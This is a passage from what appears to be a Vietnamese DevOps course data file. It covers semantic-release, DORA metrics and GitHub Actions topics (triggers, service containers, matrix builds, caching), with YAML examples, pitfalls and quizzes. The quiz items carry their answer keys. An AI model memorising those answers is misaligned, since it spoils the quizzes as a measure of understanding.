          fetch-depth: 0     # cần toàn bộ lịch sử để đọc commit từ tag trước
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx semantic-release
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`
        }
      },
      {
        h: "Kiểm soát chất lượng commit message",
        p: [
          "Tự động hoá chỉ đúng khi commit message đúng quy ước. Dùng commitlint trong git hook (husky) và trong CI để kiểm tra. Với squash merge, tiêu đề PR trở thành commit message, nên hãy kiểm tra tiêu đề PR.",
          "Với dịch vụ backend deploy liên tục, số version ít quan trọng hơn commit SHA. Nhưng với thư viện, SDK, Helm chart hay API công khai, SemVer tự động giúp người dùng tin tưởng việc nâng cấp. Tag release (ví dụ `v1.4.0`) cũng có thể là trigger để workflow deploy production."
        ]
      },
      {
        h: "Tag release kích hoạt deploy",
        p: [
          "Một mô hình phổ biến: mỗi commit trên main tự lên staging, còn production chỉ deploy khi có tag release. Workflow production lắng nghe `on: push: tags: [\"v*\"]` hoặc sự kiện `release` với `types: [published]`. Cách này cho đội một nhịp release rõ ràng và changelog đi kèm mỗi lần lên production.",
          "Khi dùng mô hình này, image vẫn phải là image đã build từ commit được gắn tag, không build lại. Bạn chỉ gắn thêm tag version vào image đã có, ví dụ dùng `docker buildx imagetools create` để thêm tag mới cho cùng digest."
        ]
      }
    ],
    summary: [
      "SemVer: MAJOR phá vỡ tương thích, MINOR thêm tính năng, PATCH sửa lỗi.",
      "Conventional Commits giúp công cụ tự tính version và sinh changelog.",
      "semantic-release release ngay khi push; release-please mở Release PR để duyệt.",
      "Cần `fetch-depth: 0` và quyền `contents: write` để tạo tag."
    ],
    pitfalls: [
      "Checkout nông (mặc định depth 1) nên công cụ không thấy tag cũ và tính sai version.",
      "Commit message tuỳ tiện như `update`, `fix bug`: changelog vô nghĩa và version tăng sai.",
      "Cấp `contents: write` cho mọi job thay vì chỉ job release."
    ],
    quiz: [
      {
        q: "Commit `feat!: đổi định dạng response` từ version 2.3.1 sẽ tạo version nào?",
        options: ["2.3.2", "2.4.0", "3.0.0", "2.3.1-beta"],
        answer: 2,
        explain: "Dấu `!` đánh dấu breaking change nên tăng MAJOR thành 3.0.0. `feat` thường tăng MINOR, `fix` tăng PATCH."
      },
      {
        q: "Điểm khác nhau chính giữa release-please và semantic-release?",
        options: ["release-please không sinh changelog", "release-please mở Release PR, merge PR mới tạo release; semantic-release release ngay khi push", "semantic-release chỉ chạy trên GitLab", "Không có khác biệt"],
        answer: 1,
        explain: "release-please thêm điểm kiểm soát bằng Release PR. Cả hai đều sinh changelog và đều dùng được với GitHub."
      },
      {
        q: "Vì sao workflow release cần `fetch-depth: 0`?",
        options: ["Để chạy nhanh hơn", "Để có toàn bộ lịch sử commit và tag, từ đó tính version tiếp theo", "Để tải dependency", "Để bật cache"],
        answer: 1,
        explain: "Mặc định checkout chỉ lấy một commit. Công cụ cần tag trước đó và các commit sau nó để quyết định version."
      }
    ]
  },
  "p08.m0.t7": {
    sections: [
      {
        h: "Bốn chỉ số DORA",
        p: [
          "DORA (DevOps Research and Assessment) là chương trình nghiên cứu nhiều năm về hiệu quả giao phần mềm. Họ đưa ra bốn chỉ số, chia thành hai nhóm: tốc độ (throughput) và độ ổn định (stability). Điểm quan trọng từ nghiên cứu là hai nhóm không đối nghịch: đội giỏi thường vừa nhanh vừa ổn định."
        ],
        list: [
          "Deployment frequency: bao lâu deploy lên production một lần.",
          "Lead time for changes: từ lúc commit tới lúc commit đó chạy trên production mất bao lâu.",
          "Change failure rate: tỷ lệ deploy gây sự cố cần khắc phục (rollback, hotfix).",
          "Time to restore service: khi có sự cố do deploy, mất bao lâu để khôi phục. Các báo cáo gần đây gọi là failed deployment recovery time."
        ]
      },
      {
        h: "Đo như thế nào",
        p: [
          "Bạn không cần công cụ đắt tiền để bắt đầu. Dữ liệu có sẵn trong hệ thống bạn đang dùng: lịch sử deployment của GitHub Environments, thời gian commit, và hệ thống quản lý sự cố. Deployment frequency đếm số lần job deploy production thành công. Lead time lấy thời điểm deploy trừ thời điểm commit. Change failure rate cần đánh dấu deploy nào gây sự cố, thường liên kết với incident hoặc rollback.",
          "Ví dụ dưới đây dùng GitHub CLI lấy danh sách deployment của environment production để đếm tần suất."
        ],
        code: {
          lang: "bash",
          file: "terminal",
          src: `# Liệt kê 100 deployment production gần nhất (số lượng và thời điểm)
gh api "repos/my-org/task-api/deployments?environment=production&per_page=100" \\
  --jq '.[] | [.created_at, .sha[0:7]] | @tsv'

# Đếm deployment theo ngày
gh api "repos/my-org/task-api/deployments?environment=production&per_page=100" \\
  --jq '.[].created_at[0:10]' | sort | uniq -c`
        }
      },
      {
        h: "Dùng đúng cách",
        p: [
          "DORA dùng để đội tự cải thiện, không phải để xếp hạng cá nhân hay so sánh các đội với nhau. Khi chỉ số trở thành mục tiêu thưởng phạt, người ta sẽ tìm cách làm đẹp số liệu: chia deploy thành nhiều lần vô nghĩa, không ghi nhận sự cố.",
          "Hãy xem chỉ số theo xu hướng. Lead time dài thường do PR lớn, review chậm hoặc pipeline chậm. Change failure rate cao thường do test yếu hoặc thay đổi lớn. Mỗi thực hành trong chương này, như trunk-based, build once, canary, feature flag, rollback tự động, đều tác động trực tiếp tới một hoặc nhiều chỉ số DORA."
        ]
      }
    ],
    summary: [
      "Bốn chỉ số: deployment frequency, lead time for changes, change failure rate, time to restore.",
      "Hai chỉ số đầu đo tốc độ, hai chỉ số sau đo độ ổn định.",
      "Dữ liệu có thể lấy từ lịch sử deployment, git và hệ thống sự cố.",
      "Dùng để đội tự cải thiện theo xu hướng, không để đánh giá cá nhân."
    ],
    pitfalls: [
      "Biến DORA thành KPI thưởng phạt, dẫn tới số liệu bị làm đẹp.",
      "Chỉ đo tốc độ mà bỏ qua change failure rate: deploy nhiều nhưng hỏng nhiều.",
      "Đo lead time từ lúc tạo ticket thay vì từ commit, làm lẫn thời gian lập kế hoạch vào chỉ số."
    ],
    quiz: [
      {
        q: "Chỉ số nào KHÔNG thuộc bốn chỉ số DORA?",
        options: ["Deployment frequency", "Lead time for changes", "Số dòng code mỗi ngày", "Change failure rate"],
        answer: 2,
        explain: "Số dòng code không phải chỉ số DORA và cũng không phản ánh hiệu quả. Ba lựa chọn còn lại đều thuộc bộ bốn chỉ số."
      },
      {
        q: "Lead time for changes đo khoảng thời gian nào?",
        options: ["Từ lúc tạo ticket tới lúc đóng ticket", "Từ lúc commit tới lúc chạy trên production", "Thời gian chạy pipeline CI", "Thời gian khôi phục sau sự cố"],
        answer: 1,
        explain: "Lead time for changes tính từ commit tới production. Thời gian khôi phục là chỉ số khác; thời gian pipeline chỉ là một phần của lead time."
      },
      {
        q: "Kết luận quan trọng từ nghiên cứu DORA về tốc độ và độ ổn định là gì?",
        options: ["Phải hy sinh một trong hai", "Đội hiệu quả thường đạt tốt cả hai", "Ổn định quan trọng hơn nên deploy ít đi", "Tốc độ không đo được"],
        answer: 1,
        explain: "Nghiên cứu cho thấy tốc độ và ổn định đi cùng nhau: thay đổi nhỏ, thường xuyên vừa nhanh vừa ít rủi ro."
      }
    ]
  },
  "p08.m1.t0": {
    sections: [
      {
        h: "Bốn khái niệm nền tảng",
        p: [
          "GitHub Actions tổ chức công việc theo bốn tầng. Hiểu rõ ranh giới giữa chúng giúp bạn biết cái gì chạy song song, cái gì dùng chung file, và lỗi xảy ra ở đâu."
        ],
        list: [
          "Workflow: một file YAML trong `.github/workflows/`, được kích hoạt bởi sự kiện (push, pull_request...).",
          "Job: một nhóm step chạy trên cùng một runner. Mặc định các job chạy song song.",
          "Step: một lệnh shell (`run`) hoặc một action (`uses`). Các step trong job chạy tuần tự và dùng chung filesystem.",
          "Runner: máy thực thi job, có thể là runner do GitHub cung cấp (`ubuntu-latest`) hoặc self-hosted."
        ]
      },
      {
        h: "Job cô lập với nhau",
        p: [
          "Mỗi job chạy trên một máy ảo mới tinh. File bạn tạo ở job `build` không tự có mặt ở job `deploy`. Muốn chuyển dữ liệu, bạn dùng artifact (file) hoặc `outputs` (chuỗi ngắn). Biến môi trường đặt trong một step cũng không tự sang step sau; muốn vậy bạn ghi vào file `$GITHUB_ENV`.",
          "`needs` tạo phụ thuộc: job chỉ chạy khi các job nó cần đã thành công. Kết hợp `needs` và `if` để tạo luồng phức tạp, ví dụ job thông báo chạy cả khi job khác lỗi bằng `if: always()`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/basics.yml",
          src: `name: Basics
on: push

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: \${{ steps.ver.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: ver
        run: echo "version=$(node -p "require('./package.json').version")" >> "$GITHUB_OUTPUT"
      - run: echo "APP_ENV=ci" >> "$GITHUB_ENV"
      - run: echo "Step sau thấy APP_ENV=$APP_ENV"

  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "chạy song song với build"

  report:
    needs: [build, test]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: echo "version \${{ needs.build.outputs.version }}, test = \${{ needs.test.result }}"`
        }
      },
      {
        h: "Mẹo đọc và gỡ lỗi",
        p: [
          "Khi job lỗi, hãy xem step nào đỏ và đọc log của đúng step đó. Mỗi step `run` mặc định chạy bằng bash với `-e` trên Linux, nên lệnh đầu tiên lỗi sẽ dừng step. Có thể bật log debug bằng cách đặt biến hoặc secret `ACTIONS_STEP_DEBUG` là `true`, hoặc chọn Re-run with debug logging.",
          "Về chi phí: runner của GitHub tính theo phút với repo private, và mỗi job có thời gian khởi động riêng. Tách quá nhiều job nhỏ làm tốn thời gian khởi động và cài dependency lặp lại; gộp quá nhiều thì mất song song. Hãy tách job theo ranh giới có ý nghĩa như lint, test, build image, deploy."
        ]
      }
    ],
    summary: [
      "Workflow chứa job, job chứa step, job chạy trên runner.",
      "Job chạy song song trên máy riêng; step trong job chạy tuần tự và chung filesystem.",
      "Dùng `needs` tạo phụ thuộc, `outputs` và artifact để truyền dữ liệu giữa job.",
      "Ghi vào `$GITHUB_OUTPUT` và `$GITHUB_ENV` để truyền giá trị giữa các step."
    ],
    pitfalls: [
      "Tạo file ở job này rồi mong job khác đọc được: phải dùng upload/download artifact.",
      "Dùng `export VAR=...` trong một step và mong step sau thấy: phải ghi vào `$GITHUB_ENV`.",
      "Dùng cú pháp cũ `::set-output` đã bị deprecated; hãy dùng `$GITHUB_OUTPUT`."
    ],
    quiz: [
      {
        q: "Hai job không có `needs` trong cùng workflow sẽ chạy thế nào?",
        options: ["Tuần tự theo thứ tự trong file", "Song song trên các runner riêng", "Trên cùng một máy", "Chỉ job đầu tiên chạy"],
        answer: 1,
        explain: "Mặc định các job chạy song song, mỗi job trên runner riêng. Muốn tuần tự phải dùng `needs`."
      },
      {
        q: "Cách đúng để truyền một chuỗi ngắn từ job build sang job deploy?",
        options: ["Biến môi trường export trong step", "Khai báo `outputs` của job và đọc qua `needs.build.outputs`", "Ghi file vào /tmp", "Không thể truyền"],
        answer: 1,
        explain: "Job outputs là cơ chế chuẩn cho giá trị ngắn. Biến export và file /tmp chỉ tồn tại trên runner của job đó."
      },
      {
        q: "`if: always()` trên một job có tác dụng gì?",
        options: ["Job chạy mọi lúc kể cả không có trigger", "Job vẫn chạy dù các job trong `needs` thất bại", "Job chạy lại vô hạn", "Job bỏ qua mọi step"],
        answer: 1,
        explain: "`always()` khiến điều kiện đúng bất kể kết quả job trước, hữu ích cho báo cáo và dọn dẹp. Nó không tạo trigger mới."
      }
    ]
  },
  "p08.m1.t1": {
    sections: [
      {
        h: "Sự kiện kích hoạt workflow",
        p: [
          "Khối `on:` quyết định khi nào workflow chạy. Chọn đúng trigger giúp tiết kiệm phút runner và tránh chạy những thứ nguy hiểm vào sai thời điểm."
        ],
        list: [
          "`push`: khi có commit đẩy lên nhánh hoặc tag; lọc bằng `branches`, `tags`, `paths`.",
          "`pull_request`: khi PR được mở, cập nhật; chạy với quyền đọc và không có secret nếu PR đến từ fork.",
          "`workflow_dispatch`: chạy tay từ giao diện hoặc CLI, có thể khai báo `inputs`.",
          "`schedule`: chạy theo cron, múi giờ UTC, ví dụ quét bảo mật hằng đêm.",
          "`release`: khi GitHub Release được tạo hoặc publish.",
          "`workflow_call`: biến workflow thành reusable workflow được workflow khác gọi."
        ]
      },
      {
        h: "Ví dụ nhiều trigger với bộ lọc",
        p: [
          "Workflow dưới đây chạy CI cho PR vào main, bỏ qua PR chỉ sửa tài liệu; chạy khi push tag dạng `v*` để release; cho phép chạy tay với tham số chọn môi trường; và quét định kỳ lúc 2 giờ sáng giờ Việt Nam (19:00 UTC)."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/triggers.yml",
          src: `name: Triggers demo
on:
  pull_request:
    branches: [main]
    paths-ignore:
      - "docs/**"
      - "**.md"
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      environment:
        description: "Môi trường deploy"
        type: choice
        options: [staging, production]
        default: staging
  schedule:
    - cron: "0 19 * * *"   # 02:00 giờ Việt Nam

permissions:
  contents: read

jobs:
  info:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "event: \${{ github.event_name }}"
          echo "ref:   \${{ github.ref }}"
          echo "env:   \${{ inputs.environment }}"`
        }
      },
      {
        h: "Các lưu ý quan trọng",
        p: [
          "Khi dùng cả `branches` và `paths` cho cùng sự kiện, workflow chỉ chạy khi thoả cả hai. Với `schedule`, GitHub có thể trễ vài phút vào giờ cao điểm, và workflow schedule chỉ chạy trên nhánh mặc định. Ở repo công khai, workflow schedule có thể bị tự động tắt khi repo không có hoạt động trong 60 ngày.",
          "Hãy phân biệt `pull_request` và `pull_request_target`. `pull_request_target` chạy trong ngữ cảnh nhánh đích, có secret và token có quyền ghi. Nếu bạn checkout code của PR từ fork và chạy nó trong workflow này, kẻ tấn công có thể đánh cắp secret. Bài bảo mật pipeline sẽ nói kỹ hơn.",
          "Workflow bị bỏ qua do lọc `paths` sẽ không báo trạng thái. Nếu check đó là bắt buộc trong branch protection, PR sẽ bị treo. Giải pháp là lọc ở cấp job bằng điều kiện, hoặc dùng một job tổng hợp luôn chạy."
        ]
      }
    ],
    summary: [
      "`on:` định nghĩa sự kiện kích hoạt: push, pull_request, workflow_dispatch, schedule, release, workflow_call.",
      "Lọc bằng `branches`, `tags`, `paths` và các biến thể `-ignore`.",
      "Cron của `schedule` dùng giờ UTC và chỉ chạy trên nhánh mặc định.",
      "Cẩn trọng với `pull_request_target` vì có secret và quyền ghi."
    ],
    pitfalls: [
      "Viết cron theo giờ Việt Nam, job chạy lệch 7 tiếng.",
      "Dùng `paths` cho workflow có required check, khiến PR không liên quan bị treo.",
      "Dùng `pull_request_target` rồi checkout và chạy code của PR."
    ],
    quiz: [
      {
        q: "Cron `0 19 * * *` trong GitHub Actions chạy lúc mấy giờ ở Việt Nam (UTC+7)?",
        options: ["19:00", "12:00", "02:00 sáng hôm sau", "07:00"],
        answer: 2,
        explain: "Cron dùng UTC. 19:00 UTC cộng 7 giờ là 02:00 sáng hôm sau giờ Việt Nam."
      },
      {
        q: "Trigger nào cho phép chạy workflow bằng tay kèm tham số?",
        options: ["schedule", "workflow_dispatch", "push", "merge_group"],
        answer: 1,
        explain: "`workflow_dispatch` hỗ trợ `inputs` và nút Run workflow. Các trigger còn lại được kích hoạt tự động bởi sự kiện."
      },
      {
        q: "Vì sao `pull_request_target` nguy hiểm khi kết hợp với checkout code PR từ fork?",
        options: ["Vì nó chạy chậm", "Vì nó có secret và token quyền ghi, trong khi code PR là code lạ", "Vì nó không hỗ trợ Linux", "Vì nó xoá nhánh main"],
        answer: 1,
        explain: "`pull_request_target` chạy với quyền của repo đích. Chạy code không tin cậy trong ngữ cảnh đó có thể làm lộ secret."
      }
    ]
  },
  "p08.m1.t2": {
    sections: [
      {
        h: "Integration test cần dịch vụ thật",
        p: [
          "Unit test với mock rất nhanh nhưng không bắt được lỗi SQL, lỗi migration, hay khác biệt hành vi của Postgres thật. Service container cho phép chạy Postgres, Redis hay bất kỳ image nào ngay bên cạnh job, sống cùng vòng đời job: khởi động trước step đầu tiên và bị xoá khi job kết thúc.",
          "Service container chỉ hỗ trợ runner Linux. Trên runner của GitHub, Docker đã được cài sẵn nên bạn không cần làm gì thêm."
        ]
      },
      {
        h: "Ví dụ Postgres và Redis",
        p: [
          "Khi job chạy trực tiếp trên runner (không có `container:`), bạn phải map port và kết nối qua `localhost`. Health check giúp job chờ tới khi database sẵn sàng trước khi chạy step."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/integration.yml",
          src: `name: Integration
on: pull_request

permissions:
  contents: read

jobs:
  integration:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:18-alpine
        env:
          POSTGRES_USER: app
          POSTGRES_PASSWORD: app
          POSTGRES_DB: app_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U app"
          --health-interval 5s
          --health-retries 10
      redis:
        image: redis:8-alpine
        ports: ["6379:6379"]
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-retries 10
    env:
      DATABASE_URL: postgres://app:app@localhost:5432/app_test
      REDIS_URL: redis://localhost:6379
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx prisma migrate deploy
      - run: npm run test:integration`
        }
      },
      {
        h: "Chạy job trong container",
        p: [
          "Nếu khai báo `container: node:24-alpine` cho job, mọi step chạy trong container đó và các service nằm cùng mạng Docker. Khi đó bạn kết nối bằng tên service làm hostname, ví dụ `postgres:5432`, và không cần map port.",
          "So sánh với Testcontainers: Testcontainers khởi động container từ chính code test, giúp test chạy giống nhau trên máy dev và CI. Service container thì đơn giản hơn, khai báo ngay trong workflow. Cả hai đều ổn; quan trọng là test chạy trên cùng phiên bản database với production.",
          "Mỗi test nên tự dọn dữ liệu, hoặc chạy trong transaction rồi rollback, để test không phụ thuộc thứ tự."
        ]
      },
      {
        h: "Mẹo để integration test nhanh và ổn định",
        p: [
          "Tách unit test và integration test thành hai job riêng: unit test phản hồi trong một phút, integration test chạy song song mà không làm chậm phản hồi đầu tiên. Chạy toàn bộ migration trên database trống ở mỗi lần CI có lợi ích phụ: phát hiện migration bị lỗi hoặc phụ thuộc thứ tự trước khi nó chạy trên production.",
          "Luôn đặt `timeout-minutes` cho job để một test treo không giữ runner hàng giờ. Seed dữ liệu tối thiểu mà mỗi test cần, thay vì một bản dump lớn từ production vừa chậm vừa có nguy cơ lộ dữ liệu cá nhân.",
          "Với dịch vụ không có image nhẹ, hoặc cần cấu hình phức tạp, hãy cân nhắc Testcontainers hoặc Docker Compose trong step, đổi lại cấu hình dài hơn."
        ]
      }
    ],
    summary: [
      "Service container chạy database, cache thật bên cạnh job để integration test.",
      "Job trên runner: map port, dùng `localhost`. Job trong container: dùng tên service làm hostname.",
      "Luôn khai báo health check để step không chạy trước khi dịch vụ sẵn sàng.",
      "Dùng cùng phiên bản database với production."
    ],
    pitfalls: [
      "Thiếu health check, test chạy khi Postgres chưa nhận kết nối và lỗi ngẫu nhiên.",
      "Dùng `localhost` khi job chạy trong container, hoặc dùng tên service khi job chạy trên runner.",
      "Test phụ thuộc dữ liệu do test khác tạo ra, chạy song song thì lỗi."
    ],
    quiz: [
      {
        q: "Job chạy trực tiếp trên `ubuntu-latest` với service `postgres` map port 5432. Host kết nối là gì?",
        options: ["postgres", "localhost", "db.internal", "0.0.0.0:80"],
        answer: 1,
        explain: "Khi job chạy trên runner, service được map port ra máy chủ nên dùng `localhost`. Tên service chỉ dùng khi job chạy trong container."
      },
      {
        q: "Tác dụng của `--health-cmd` trong options của service?",
        options: ["Giới hạn RAM", "GitHub chờ service khỏe mạnh trước khi chạy step", "Tự động chạy migration", "Xoá dữ liệu sau test"],
        answer: 1,
        explain: "Health check cho runner biết khi nào container sẵn sàng. Nó không chạy migration hay dọn dữ liệu."
      },
      {
        q: "Service container hỗ trợ loại runner nào?",
        options: ["Chỉ Windows", "Chỉ macOS", "Linux", "Mọi hệ điều hành như nhau"],
        answer: 2,
        explain: "Service container yêu cầu runner Linux có Docker. Runner Windows và macOS không hỗ trợ tính năng này."
      }
    ]
  },
  "p08.m1.t3": {
    sections: [
      {
        h: "Matrix: một job, nhiều cấu hình",
        p: [
          "Matrix build tạo nhiều bản chạy của cùng một job với các tổ hợp tham số khác nhau. Thư viện cần chạy trên nhiều phiên bản Node, CLI cần chạy trên Linux, macOS và Windows. Thay vì copy job nhiều lần, bạn khai báo `strategy.matrix`.",
          "Với ứng dụng backend chỉ chạy một phiên bản Node trên production, matrix ít cần thiết hơn. Nhưng nó vẫn hữu ích khi chuẩn bị nâng phiên bản: chạy song song phiên bản hiện tại và phiên bản mới để thấy trước lỗi."
        ]
      },
      {
        h: "Ví dụ với include và exclude",
        p: [
          "Matrix dưới đây tạo tổ hợp 2 phiên bản Node × 2 hệ điều hành, bỏ bớt một tổ hợp bằng `exclude`, và thêm một tổ hợp đặc biệt có biến riêng bằng `include`."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/matrix.yml",
          src: `name: Matrix
on: pull_request

permissions:
  contents: read

jobs:
  test:
    runs-on: \${{ matrix.os }}
    strategy:
      fail-fast: false
      max-parallel: 4
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [22, 24]
        exclude:
          - os: windows-latest
            node: 22
        include:
          - os: ubuntu-latest
            node: 24
            coverage: true
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: \${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test
      - if: matrix.coverage
        run: npm run test:coverage`
        }
      },
      {
        h: "fail-fast và chi phí",
        p: [
          "Mặc định `fail-fast` là `true`: một tổ hợp lỗi thì các tổ hợp đang chạy bị huỷ. Điều này tiết kiệm phút runner nhưng bạn không biết lỗi có xảy ra ở mọi tổ hợp hay chỉ một. Khi debug vấn đề tương thích, đặt `fail-fast: false` để thấy toàn cảnh.",
          "Lưu ý `include` có hai hành vi: nếu các khoá trong phần tử include khớp một tổ hợp có sẵn, nó bổ sung biến vào tổ hợp đó (như `coverage: true` ở trên); nếu không khớp, nó thêm tổ hợp mới. Matrix còn có thể dùng để chia nhỏ bộ test lớn thành nhiều shard chạy song song.",
          "Chi phí tăng theo số tổ hợp. Runner Windows và macOS tính phút đắt hơn Linux với repo private. Chỉ đưa vào matrix những thứ bạn thực sự hỗ trợ."
        ]
      },
      {
        h: "Chia shard bộ test lớn",
        p: [
          "Khi bộ test chạy 20 phút, matrix có thể chia nó thành nhiều phần chạy song song. Jest và Playwright đều hỗ trợ cờ `--shard=chỉ-số/tổng`. Ba shard gần như chia ba thời gian chờ, đổi lại tốn thêm phút runner cho phần cài đặt lặp lại ở mỗi shard."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/test-shards.yml",
          src: `name: Test shards
on: pull_request

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci
      - run: npx jest --shard=\${{ matrix.shard }}/3`
        }
      }
    ],
    summary: [
      "`strategy.matrix` tạo nhiều bản chạy của một job theo tổ hợp tham số.",
      "`exclude` bỏ tổ hợp, `include` thêm tổ hợp hoặc thêm biến vào tổ hợp có sẵn.",
      "`fail-fast: false` giúp thấy kết quả mọi tổ hợp khi debug.",
      "Matrix cũng dùng để chia shard test chạy song song."
    ],
    pitfalls: [
      "Đặt required check theo tên job matrix: tên thực tế có hậu tố như `test (ubuntu-latest, 24)`, đổi matrix là check bị treo.",
      "Matrix quá rộng với runner macOS/Windows, tốn phút mà không mang lại giá trị.",
      "Giữ phiên bản Node đã hết hỗ trợ trong matrix quá lâu."
    ],
    quiz: [
      {
        q: "Matrix `os: [a, b]` và `node: [22, 24]` không có include/exclude tạo bao nhiêu job?",
        options: ["2", "3", "4", "6"],
        answer: 2,
        explain: "Matrix tạo tích Descartes: 2 × 2 = 4 tổ hợp."
      },
      {
        q: "`fail-fast: true` (mặc định) có tác dụng gì?",
        options: ["Chạy lại job lỗi", "Huỷ các tổ hợp còn lại khi một tổ hợp lỗi", "Bỏ qua lỗi", "Chạy tuần tự các tổ hợp"],
        answer: 1,
        explain: "fail-fast huỷ các job cùng matrix khi một job lỗi để tiết kiệm tài nguyên. Nó không retry và không bỏ qua lỗi."
      },
      {
        q: "Phần tử `include` có khoá khớp một tổ hợp có sẵn sẽ làm gì?",
        options: ["Tạo tổ hợp trùng lặp", "Thêm biến mới vào tổ hợp đó", "Xoá tổ hợp đó", "Báo lỗi cú pháp"],
        answer: 1,
        explain: "Khi khớp, include bổ sung giá trị vào tổ hợp có sẵn. Chỉ khi không khớp nó mới tạo tổ hợp mới."
      }
    ]
  },
  "p08.m1.t4": {
    sections: [
      {
        h: "Cache và artifact khác nhau thế nào",
        p: [
          "Cache và artifact đều lưu file ngoài runner, nhưng mục đích khác nhau. Cache để tăng tốc: lưu thứ có thể tạo lại (thư mục npm cache, layer Docker), dùng lại giữa các lần chạy. Mất cache thì build chậm hơn chứ không sai. Artifact để truyền kết quả: báo cáo coverage, file build, SBOM; dùng giữa các job trong cùng một run, hoặc tải về để xem."
        ],
        list: [
          "`setup-node` với `cache: npm`: cách đơn giản nhất, tự tạo key theo `package-lock.json`.",
          "`actions/cache`: cache tuỳ ý với `key` và `restore-keys` do bạn tự định nghĩa.",
          "Docker layer cache `type=gha`: lưu layer vào cache của GitHub Actions qua Buildx.",
          "`actions/upload-artifact` / `download-artifact`: chuyển file giữa các job."
        ]
      },
      {
        h: "Ví dụ Docker cache và artifact",
        p: [
          "Lần build đầu tiên tải và build mọi layer. Từ lần thứ hai, layer không đổi (ví dụ layer `npm ci` khi lockfile không đổi) được lấy từ cache. `mode=max` lưu cả layer của các stage trung gian trong Dockerfile multi-stage."
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/build.yml",
          src: `name: Build
on: push

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version: 24
          cache: npm
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: dist
          path: dist/
          retention-days: 7
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: false
          cache-from: type=gha
          cache-to: type=gha,mode=max

  e2e:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
        with:
          name: dist
          path: dist/
      - run: ls -la dist/`
        }
      },
      {
        h: "Thiết kế cache key",
        p: [
          "Với `actions/cache`, key nên chứa hash của file quyết định nội dung cache, ví dụ `hashFiles('**/package-lock.json')`, kèm hệ điều hành. `restore-keys` là tiền tố dự phòng: khi không khớp chính xác, lấy cache gần nhất có cùng tiền tố. Cache không bao giờ được chứa secret vì cache có thể được đọc bởi các workflow khác trong repo.",
          "Cache có giới hạn dung lượng theo repo và cache lâu không dùng sẽ bị xoá. Thứ tự Dockerfile cũng quan trọng: copy `package*.json` và chạy `npm ci` trước khi copy mã nguồn, để sửa code không làm mất cache của layer dependency."
        ]
      },
      {
        h: "Khi nào cần actions/cache",
        p: [
          "Cache của `setup-node` chỉ lưu thư mục cache của npm. Khi cần cache thứ khác, như cache build của Next.js, cache của Turborepo hay thư mục tải về của Playwright, bạn dùng `actions/cache` với key tự thiết kế, ví dụ `${{ runner.os }}-next-${{ hashFiles('**/package-lock.json') }}`. Nhớ pin action này theo commit SHA như mọi action khác.",
          "Cache có phạm vi theo nhánh: workflow của PR đọc được cache tạo ở nhánh đích như main, nhưng cache tạo trong PR chỉ dùng được trong PR đó. Vì vậy hãy để workflow trên main chạy thường xuyên để luôn có cache mới cho mọi PR."
        ]
      }
    ],
    summary: [
      "Cache tăng tốc giữa các lần chạy; artifact truyền kết quả giữa các job.",
      "`setup-node` với `cache: npm` là cách cache dependency đơn giản nhất.",
      "Docker layer cache dùng `cache-from/cache-to: type=gha` với Buildx.",
      "Cache key nên dựa trên hash lockfile; không bao giờ cache secret."
    ],
    pitfalls: [
      "Cache thư mục `node_modules` rồi dùng lại giữa các phiên bản Node, gây lỗi native module khó hiểu.",
      "Copy toàn bộ mã nguồn trước `npm ci` trong Dockerfile, mỗi lần sửa code là mất cache dependency.",
      "Dùng artifact với retention mặc định cho file lớn, tốn dung lượng lưu trữ."
    ],
    quiz: [
      {
        q: "Bạn cần chuyển thư mục `dist/` từ job build sang job e2e. Dùng gì?",
        options: ["actions/cache", "upload-artifact rồi download-artifact", "Biến môi trường", "Job outputs"],
        answer: 1,
        explain: "Artifact là cơ chế truyền file giữa các job trong một run. Cache có thể bị xoá và không đảm bảo; outputs chỉ dành cho chuỗi ngắn."
      },
      {
